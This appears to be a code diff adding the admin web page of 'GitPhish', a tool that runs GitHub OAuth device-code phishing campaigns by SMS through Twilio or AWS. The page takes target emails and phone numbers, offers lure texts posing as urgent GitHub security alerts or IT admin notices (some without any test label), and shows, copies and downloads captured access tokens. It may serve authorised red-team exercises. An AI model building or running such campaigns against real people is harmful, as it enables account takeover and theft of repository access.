@@ -1,0 +1,898 @@
+{% extends "base.html" %}
+
+{% block title %}SMS Campaigns - GitPhish Admin{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <!-- Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="d-flex justify-content-between align-items-center">
+                <div>
+                    <h2><i class="fas fa-sms me-2"></i>SMS Campaigns</h2>
+                    <p class="text-muted">Manage GitHub OAuth device code phishing campaigns via SMS delivery</p>
+                </div>
+                <div>
+                    <button class="btn btn-primary me-2" onclick="showCampaignModal('github', 'twilio')">
+                        <i class="fas fa-plus me-2"></i>New Twilio Campaign
+                    </button>
+                    <button class="btn btn-warning" onclick="showCampaignModal('github', 'aws')">
+                        <i class="fas fa-plus me-2"></i>New AWS Campaign
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Active Campaigns -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-list me-2"></i>Campaign Management
+                    </h5>
+                    <button class="btn btn-sm btn-outline-secondary" onclick="refreshCampaigns()">
+                        <i class="fas fa-sync-alt me-1"></i>Refresh
+                    </button>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-dark table-striped">
+                            <thead>
+                                <tr>
+                                    <th>Campaign ID</th>
+                                    <th>Platform</th>
+                                    <th>Provider</th>
+                                    <th>Targets</th>
+                                    <th>Status</th>
+                                    <th>Started</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="campaignsTableBody">
+                                <tr>
+                                    <td colspan="7" class="text-center text-muted py-4">
+                                        <i class="fas fa-inbox fa-2x mb-2"></i>
+                                        <div>No campaigns yet. Create your first SMS campaign above.</div>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Campaign Creation Modal -->
+<div class="modal fade" id="campaignModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content bg-dark">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-plus me-2"></i>Create SMS Campaign
+                </h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="campaignForm">
+                    <input type="hidden" id="campaignPlatform" value="">
+                    <input type="hidden" id="campaignProvider" value="">
+                    
+                    <!-- Campaign Details -->
+                    <div class="row mb-3">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h6 class="mb-0"><i class="fas fa-info-circle me-2"></i>Campaign Details</h6>
+                                </div>
+                                <div class="card-body">
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">Campaign Name</label>
+                                        <input type="text" class="form-control" id="campaignName" placeholder="Enter campaign name" required>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Provider Configuration -->
+                    <div class="row mb-3">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h6 class="mb-0"><i class="fas fa-cog me-2"></i>Provider Configuration</h6>
+                                </div>
+                                <div class="card-body">
+                                    <!-- Twilio Config -->
+                                    <div id="twilioConfig" class="d-none">
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Twilio Account SID</label>
+                                            <input type="text" class="form-control" id="twilioSid" placeholder="Enter Twilio SID">
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Twilio Auth Token</label>
+                                            <input type="password" class="form-control" id="twilioToken" placeholder="Enter Twilio Token">
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">From Phone Number</label>
+                                            <input type="text" class="form-control" id="fromPhone" placeholder="Enter Twilio phone number">
+                                        </div>
+                                        <button type="button" class="btn btn-sm btn-outline-info" onclick="testTwilioConfig()">
+                                            <i class="fas fa-check me-1"></i>Test Config
+                                        </button>
+                                    </div>
+
+                                    <!-- AWS Config -->
+                                    <div id="awsConfig" class="d-none">
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">AWS Access Key ID</label>
+                                            <input type="text" class="form-control" id="awsAccessKeyId" placeholder="Enter AWS Access Key ID">
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">AWS Secret Access Key</label>
+                                            <input type="password" class="form-control" id="awsSecretAccessKey" placeholder="Enter AWS Secret Access Key">
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">AWS Session Token (Optional)</label>
+                                            <input type="password" class="form-control" id="awsSessionToken" placeholder="Enter AWS Session Token (if using temporary credentials)">
+                                            <div class="form-text">Required only for temporary/STS credentials</div>
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Region</label>
+                                            <select class="form-select" id="awsRegion">
+                                                <option value="us-east-1">us-east-1</option>
+                                                <option value="us-east-2" selected>us-east-2</option>
+                                                <option value="us-west-1">us-west-1</option>
+                                                <option value="us-west-2">us-west-2</option>
+                                                <option value="eu-west-1">eu-west-1</option>
+                                                <option value="ap-southeast-1">ap-southeast-1</option>
+                                            </select>
+                                        </div>
+                                        <div class="d-flex gap-2">
+                                            <button type="button" class="btn btn-sm btn-outline-info" onclick="testAwsConfig()">
+                                                <i class="fas fa-check me-1"></i>Test Config
+                                            </button>
+                                            <button type="button" class="btn btn-sm btn-outline-secondary" onclick="listAwsNumbers()">
+                                                <i class="fas fa-list me-1"></i>List Numbers
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Target Configuration -->
+                    <div class="row mb-3">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h6 class="mb-0"><i class="fas fa-bullseye me-2"></i>Target Configuration</h6>
+                                </div>
+                                <div class="card-body">
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">Target Method</label>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="targetMethod" id="singleTarget" value="single" checked onclick="toggleTargetInput()">
+                                            <label class="form-check-label" for="singleTarget">
+                                                Single Target
+                                            </label>
+                                        </div>
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="radio" name="targetMethod" id="fileTarget" value="file" onclick="toggleTargetInput()">
+                                            <label class="form-check-label" for="fileTarget">
+                                                Target File (CSV)
+                                            </label>
+                                        </div>
+                                    </div>
+                                    
+                                    <div id="singleTargetInputs">
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Target Email</label>
+                                            <input type="email" class="form-control" id="targetEmail" placeholder="target@example.com">
+                                        </div>
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Target Phone</label>
+                                            <input type="tel" class="form-control" id="targetPhone" placeholder="+1234567890">
+                                        </div>
+                                    </div>
+                                    
+                                    <div id="fileTargetInputs" class="d-none">
+                                        <div class="form-group mb-3">
+                                            <label class="form-label">Target File (CSV)</label>
+                                            <input type="file" class="form-control" id="targetFile" accept=".csv,.txt">
+                                            <div class="form-text">Format: email,phone (one per line)</div>
+                                        </div>
+                                        <button type="button" class="btn btn-sm btn-outline-info" onclick="showUploadModal()">
+                                            <i class="fas fa-upload me-1"></i>Upload File
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Advanced Options -->
+                    <div class="row mb-3">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h6 class="mb-0"><i class="fas fa-sliders-h me-2"></i>Advanced Options</h6>
+                                </div>
+                                <div class="card-body">
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">OAuth Scopes</label>
+                                        <input type="text" class="form-control" id="oauthScope" value="repo user" placeholder="repo user">
+                                        <div class="form-text">For GitHub campaigns only</div>
+                                    </div>
+                                    
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">SMS Message Template</label>
+                                        <div class="mb-2">
+                                            <select class="form-select form-select-sm" id="templatePreset" onchange="loadMessageTemplate()">
+                                                <option value="default">Default - Device Enrollment</option>
+                                                <option value="urgent">Urgent - Account Security</option>
+                                                <option value="admin">Admin - Access Review</option>
+                                                <option value="update">Update - System Maintenance</option>
+                                                <option value="custom">Custom Message</option>
+                                            </select>
+                                        </div>
+                                        <textarea class="form-control" id="messageTemplate" rows="6" placeholder="SMS message template with variables: {email}, {verification_uri}, {user_code}"></textarea>
+                                        <div class="form-text">
+                                            Available variables: {email}, {verification_uri}, {user_code}, {device_code}
+                                        </div>
+                                        <div class="d-flex gap-2 mt-2">
+                                            <button type="button" class="btn btn-sm btn-outline-info" onclick="previewMessage()">
+                                                <i class="fas fa-eye me-1"></i>Preview Message
+                                            </button>
+                                            <small class="text-muted align-self-center">
+                                                <span id="charCount">0</span>/1600 characters
+                                            </small>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">Encryption Key (Optional)</label>
+                                        <input type="text" class="form-control" id="encryptionKey" placeholder="Base64 encryption key for token storage">
+                                        <div class="form-text">Leave blank for unencrypted token storage</div>
+                                        <button type="button" class="btn btn-sm btn-outline-secondary mt-2" onclick="generateEncryptionKey()">
+                                            <i class="fas fa-key me-1"></i>Generate Key
+                                        </button>
+                                    </div>
+                                    
+                                    <div class="form-group mb-3">
+                                        <label class="form-label">Proxy (Optional)</label>
+                                        <input type="text" class="form-control" id="proxyUrl" placeholder="http://127.0.0.1:8080">
+                                    </div>
+                                    
+                                    <div class="form-check">
+                                        <input class="form-check-input" type="checkbox" id="debugMode">
+                                        <label class="form-check-label" for="debugMode">
+                                            Enable Debug Mode
+                                        </label>
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" onclick="startCampaign()">
+                    <i class="fas fa-play me-2"></i>Start Campaign
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Campaign Live Console Modal -->
+<div class="modal fade" id="liveConsoleModal" tabindex="-1">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content bg-dark">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-terminal me-2"></i>Live Campaign Console
+                </h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <!-- Campaign Info -->
+                <div class="row mb-3">
+                    <div class="col-md-3">
+                        <div class="card bg-primary">
+                            <div class="card-body text-center">
+                                <i class="fas fa-play fa-2x mb-2"></i>
+                                <h6>Status</h6>
+                                <span id="liveStatus">Loading...</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="card bg-info">
+                            <div class="card-body text-center">
+                                <i class="fas fa-sms fa-2x mb-2"></i>
+                                <h6>SMS Sent</h6>
+                                <span id="liveSmsSent">0</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="card bg-success">
+                            <div class="card-body text-center">
+                                <i class="fas fa-key fa-2x mb-2"></i>
+                                <h6>Tokens Captured</h6>
+                                <span id="liveTokensCaptured">0</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="card bg-warning">
+                            <div class="card-body text-center">
+                                <i class="fas fa-clock fa-2x mb-2"></i>
+                                <h6>Runtime</h6>
+                                <span id="liveRuntime">0s</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Live Console Output -->
+                <div class="row mb-3">
+                    <div class="col-12">
+                        <div class="card">
+                            <div class="card-header d-flex justify-content-between align-items-center">
+                                <h6 class="mb-0">Live Output</h6>
+                                <div>
+                                    <button class="btn btn-sm btn-outline-secondary" onclick="downloadCampaignLogs(currentCampaignId)">
+                                        <i class="fas fa-download me-1"></i>Download Logs
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-info" onclick="refreshLiveConsole()">
+                                        <i class="fas fa-sync-alt me-1"></i>Refresh
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="card-body">
+                                <pre id="liveConsoleOutput" style="height: 300px; overflow-y: auto; background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace;"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Captured Tokens -->
+                <div class="row">
+                    <div class="col-12">
+                        <div class="card">
+                            <div class="card-header d-flex justify-content-between align-items-center">
+                                <h6 class="mb-0">Captured Tokens</h6>
+                                <button class="btn btn-sm btn-outline-success" onclick="downloadCampaignTokens(currentCampaignId)">
+                                    <i class="fas fa-download me-1"></i>Download Tokens
+                                </button>
+                            </div>
+                            <div class="card-body">
+                                <div id="capturedTokensList">
+                                    <div class="text-center text-muted py-3">
+                                        <i class="fas fa-key fa-2x mb-2"></i>
+                                        <div>No tokens captured yet</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-danger" onclick="stopCampaign(currentCampaignId)">
+                    <i class="fas fa-stop me-2"></i>Stop Campaign
+                </button>
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Message Preview Modal -->
+<div class="modal fade" id="messagePreviewModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content bg-dark">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-eye me-2"></i>Message Preview
+                </h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="card">
+                    <div class="card-header">
+                        <h6 class="mb-0">SMS Preview</h6>
+                    </div>
+                    <div class="card-body">
+                        <div id="messagePreviewContent" style="background: #f8f9fa; color: #333; padding: 15px; border-radius: 5px; font-family: system-ui;">
+                            <!-- Message preview will be shown here -->
+                        </div>
+                        <div class="mt-2">
+                            <small class="text-muted">
+                                Character count: <span id="previewCharCount">0</span>/1600
+                            </small>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentCampaignId = null;
+let liveUpdateInterval = null;
+
+// Message templates
+const messageTemplates = {
+    default: `GitPhish Security Test - GitHub Device Verification
+
+Your GitHub device enrollment for {email} requires verification.
+
+Please visit: {verification_uri}
+Enter code: {user_code}
+
+This code expires in 15 minutes.
+
+[This is a security test - GitPhish v0.2.0]`,
+    
+    urgent: `🚨 URGENT: GitHub Security Alert
+
+Your account {email} requires immediate verification due to suspicious activity.
+
+📱 Verify now: {verification_uri}
+🔐 Code: {user_code}
+
+⏰ Expires in 15 minutes. Act now to secure your account!
+
+[Security Test - GitPhish]`,
+    
+    admin: `IT Admin Notice - GitHub Re-authentication Required
+
+User: {email}
+Action Required: Device verification for organizational access
+
+Access: {verification_uri}
+Code: {user_code}
+
+Complete within 15 minutes to maintain access.
+
+IT Security Team`,
+    
+    update: `GitHub System Update - Verification Required
+
+Account: {email}
+System maintenance requires device re-verification.
+
+Update URL: {verification_uri}
+Verification Code: {user_code}
+
+Valid for 15 minutes.
+
+GitHub Security`,
+    
+    custom: ""
+};
+
+function showCampaignModal(platform, provider) {
+    document.getElementById('campaignPlatform').value = platform;
+    document.getElementById('campaignProvider').value = provider;
+    
+    // Show appropriate config section
+    document.getElementById('twilioConfig').classList.toggle('d-none', provider !== 'twilio');
+    document.getElementById('awsConfig').classList.toggle('d-none', provider !== 'aws');
+    
+    // Update modal title
+    const providerName = provider === 'twilio' ? 'Twilio' : 'AWS SNS';
+    document.querySelector('#campaignModal .modal-title').innerHTML = 
+        `<i class="fas fa-plus me-2"></i>Create ${providerName} SMS Campaign`;
+    
+    // Load default template
+    loadMessageTemplate();
+    
+    new bootstrap.Modal(document.getElementById('campaignModal')).show();
+}
+
+function loadMessageTemplate() {
+    const preset = document.getElementById('templatePreset').value;
+    const textarea = document.getElementById('messageTemplate');
+    
+    if (preset !== 'custom') {
+        textarea.value = messageTemplates[preset];
+    } else {
+        textarea.value = '';
+    }
+    
+    updateCharCount();
+}
+
+function previewMessage() {
+    const template = document.getElementById('messageTemplate').value;
+    const email = document.getElementById('targetEmail').value || 'target@example.com';
+    
+    // Sample data for preview
+    const sampleData = {
+        email: email,
+        verification_uri: 'https://github.com/login/device',
+        user_code: 'ABCD-1234',
+        device_code: 'sample_device_code_1234567890'
+    };
+    
+    let preview = template;
+    Object.keys(sampleData).forEach(key => {
+        preview = preview.replace(new RegExp(`{${key}}`, 'g'), sampleData[key]);
+    });
+    
+    document.getElementById('messagePreviewContent').innerHTML = preview.replace(/\n/g, '<br>');
+    document.getElementById('previewCharCount').textContent = preview.length;
+    
+    new bootstrap.Modal(document.getElementById('messagePreviewModal')).show();
+}
+
+function updateCharCount() {
+    const text = document.getElementById('messageTemplate').value;
+    document.getElementById('charCount').textContent = text.length;
+}
+
+// Add event listener for character counting
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('messageTemplate').addEventListener('input', updateCharCount);
+});
+
+function toggleTargetInput() {
+    const method = document.querySelector('input[name="targetMethod"]:checked').value;
+    
+    document.getElementById('singleTargetInputs').classList.toggle('d-none', method !== 'single');
+    document.getElementById('fileTargetInputs').classList.toggle('d-none', method !== 'file');
+}
+
+function generateEncryptionKey() {
+    // Generate a random 32-byte key and encode as base64
+    const array = new Uint8Array(32);
+    crypto.getRandomValues(array);
+    const key = btoa(String.fromCharCode(...array));
+    document.getElementById('encryptionKey').value = key;
+}
+
+function testTwilioConfig() {
+    const data = {
+        sid: document.getElementById('twilioSid').value,
+        token: document.getElementById('twilioToken').value
+    };
+    
+    fetch('/api/sms-campaigns/test-twilio', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ ' + data.message);
+        } else {
+            alert('❌ ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('❌ Error: ' + error.message);
+    });
+}
+
+function testAwsConfig() {
+    const data = {
+        accessKeyId: document.getElementById('awsAccessKeyId').value,
+        secretAccessKey: document.getElementById('awsSecretAccessKey').value,
+        sessionToken: document.getElementById('awsSessionToken').value,
+        region: document.getElementById('awsRegion').value
+    };
+    
+    fetch('/api/sms-campaigns/test-aws', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ ' + data.message);
+        } else {
+            alert('❌ ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('❌ Error: ' + error.message);
+    });
+}
+
+function listAwsNumbers() {
+    const region = document.getElementById('awsRegion').value;
+    
+    fetch(`/api/sms-campaigns/list-aws-numbers?region=${region}`)
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            let message = 'AWS SMS Numbers:\n\n';
+            data.numbers.forEach(pool => {
+                message += `Pool ${pool.id} (${pool.status}):\n`;
+                pool.numbers.forEach(num => {
+                    message += `  - ${num.identity} (${num.country})\n`;
+                });
+                message += '\n';
+            });
+            alert(message);
+        } else {
+            alert('❌ ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('❌ Error: ' + error.message);
+    });
+}
+
+function startCampaign() {
+    const formData = {
+        platform: document.getElementById('campaignPlatform').value,
+        provider: document.getElementById('campaignProvider').value,
+        name: document.getElementById('campaignName').value,
+        targetMethod: document.querySelector('input[name="targetMethod"]:checked').value,
+        targetEmail: document.getElementById('targetEmail').value,
+        targetPhone: document.getElementById('targetPhone').value,
+        scope: document.getElementById('oauthScope').value,
+        messageTemplate: document.getElementById('messageTemplate').value,
+        encryptionKey: document.getElementById('encryptionKey').value,
+        debug: document.getElementById('debugMode').checked
+    };
+    
+    // Add provider-specific data
+    if (formData.provider === 'twilio') {
+        formData.twilioSid = document.getElementById('twilioSid').value;
+        formData.twilioToken = document.getElementById('twilioToken').value;
+        formData.fromPhone = document.getElementById('fromPhone').value;
+    } else if (formData.provider === 'aws') {
+        formData.awsAccessKeyId = document.getElementById('awsAccessKeyId').value;
+        formData.awsSecretAccessKey = document.getElementById('awsSecretAccessKey').value;
+        formData.awsSessionToken = document.getElementById('awsSessionToken').value;
+        formData.awsRegion = document.getElementById('awsRegion').value;
+    }
+    
+    // Validate required fields
+    if (!formData.name) {
+        alert('❌ Campaign name is required');
+        return;
+    }
+    
+    if (formData.targetMethod === 'single' && (!formData.targetEmail || !formData.targetPhone)) {
+        alert('❌ Target email and phone are required');
+        return;
+    }
+    
+    fetch('/api/sms-campaigns/start', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ Campaign started successfully!');
+            bootstrap.Modal.getInstance(document.getElementById('campaignModal')).hide();
+            refreshCampaigns();
+        } else {
+            alert('❌ ' + data.error);
+        }
+    })
+    .catch(error => {
+        alert('❌ Error: ' + error.message);
+    });
+}
+
+function viewCampaign(campaignId) {
+    currentCampaignId = campaignId;
+    
+    // Show live console modal
+    new bootstrap.Modal(document.getElementById('liveConsoleModal')).show();
+    
+    // Start live updates
+    refreshLiveConsole();
+    liveUpdateInterval = setInterval(refreshLiveConsole, 3000);
+    
+    // Stop updates when modal is closed
+    document.getElementById('liveConsoleModal').addEventListener('hidden.bs.modal', function() {
+        if (liveUpdateInterval) {
+            clearInterval(liveUpdateInterval);
+            liveUpdateInterval = null;
+        }
+    });
+}
+
+function refreshLiveConsole() {
+    if (!currentCampaignId) return;
+    
+    fetch(`/api/sms-campaigns/logs/${currentCampaignId}`)
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            // Update stats
+            document.getElementById('liveStatus').textContent = data.stats.status;
+            document.getElementById('liveSmsSent').textContent = data.stats.sms_sent;
+            document.getElementById('liveTokensCaptured').textContent = data.stats.tokens_captured;
+            document.getElementById('liveRuntime').textContent = data.stats.runtime;
+            
+            // Update console output
+            document.getElementById('liveConsoleOutput').textContent = data.output || 'No output yet...';
+            
+            // Update tokens list
+            const tokensList = document.getElementById('capturedTokensList');
+            if (data.tokens && data.tokens.length > 0) {
+                tokensList.innerHTML = '';
+                data.tokens.forEach(token => {
+                    const tokenDiv = document.createElement('div');
+                    tokenDiv.className = 'alert alert-success';
+                    tokenDiv.innerHTML = `
+                        <div class="d-flex justify-content-between align-items-center">
+                            <div>
+                                <strong>${token.email}</strong><br>
+                                <small>Captured: ${new Date(token.captured_at * 1000).toLocaleString()}</small>
+                            </div>
+                            <div>
+                                <input type="text" class="form-control form-control-sm bg-dark text-light" value="${token.access_token}" readonly>
+                                <button class="btn btn-sm btn-outline-light mt-1" onclick="copyToClipboard('${token.access_token}')">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    tokensList.appendChild(tokenDiv);
+                });
+            }
+        } else {
+            console.error('Error getting live logs:', data.error);
+        }
+    })
+    .catch(error => {
+        console.error('Error refreshing live console:', error);
+    });
+}
+
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        // Show temporary success message
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
+        button.classList.add('btn-success');
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.classList.remove('btn-success');
+        }, 2000);
+    });
+}
+
+function stopCampaign(campaignId) {
+    if (confirm('Are you sure you want to stop this campaign?')) {
+        fetch(`/api/sms-campaigns/stop/${campaignId}`, {
+            method: 'POST'
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert('✅ Campaign stopped successfully');
+                refreshCampaigns();
+                refreshLiveConsole();
+            } else {
+                alert('❌ ' + data.error);
+            }
+        })
+        .catch(error => {
+            alert('❌ Error: ' + error.message);
+        });
+    }
+}
+
+function downloadCampaignLogs(campaignId) {
+    const link = document.createElement('a');
+    link.href = `/api/sms-campaigns/logs/${campaignId}/download`;
+    link.download = `campaign-${campaignId}-logs.txt`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+
+function downloadCampaignTokens(campaignId) {
+    fetch(`/api/sms-campaigns/tokens/${campaignId}/download`)
+    .then(response => response.json())
+    .then(data => {
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `campaign-${campaignId}-tokens.json`;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+    });
+}
+
+function showLogs() {
+    window.open('/logs', '_blank');
+}
+
+function getStatusBadgeClass(status) {
+    switch(status) {
+        case 'running':
+            return 'success';
+        case 'completed':
+            return 'info';
+        case 'token received':
+            return 'primary';
+        case 'expired':
+            return 'secondary';
+        case 'failed':
+            return 'danger';
+        case 'stopped':
+            return 'warning';
+        default:
+            return 'secondary';
+    }
+}
+
+function refreshCampaigns() {
+    fetch('/api/sms-campaigns/list')
+    .then(response => response.json())
+    .then(data => {
+        const tbody = document.getElementById('campaignsTableBody');
+        if (data.campaigns && data.campaigns.length > 0) {
+            tbody.innerHTML = data.campaigns.map(campaign => `
+                <tr>
+                    <td>${campaign.id}</td>
+                    <td>${campaign.platform}</td>
+                    <td>${campaign.provider}</td>
+                    <td>${campaign.target_count}</td>
+                    <td><span class="badge bg-${getStatusBadgeClass(campaign.status)}">${campaign.status}</span></td>
+                    <td>${new Date(campaign.started).toLocaleString()}</td>
+                    <td>
+                        <button class="btn btn-sm btn-outline-info" onclick="viewCampaign('${campaign.id}')">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                        ${campaign.status === 'running' ? `
+                            <button class="btn btn-sm btn-outline-danger" onclick="stopCampaign('${campaign.id}')">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                        ` : ''}
+                    </td>
+                </tr>
+            `).join('');
+        } else {
+            tbody.innerHTML = `
+                <tr>
+                    <td colspan="7" class="text-center text-muted py-4">
+                        <i class="fas fa-inbox fa-2x mb-2"></i>
+                        <div>No campaigns yet. Create your first SMS campaign above.</div>
+                    </td>
+                </tr>
+            `;
+        }
+    })
+    .catch(error => {
+        console.error('Error refreshing campaigns:', error);
+    });
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+    refreshCampaigns();
+});
+</script>
+{% endblock %}
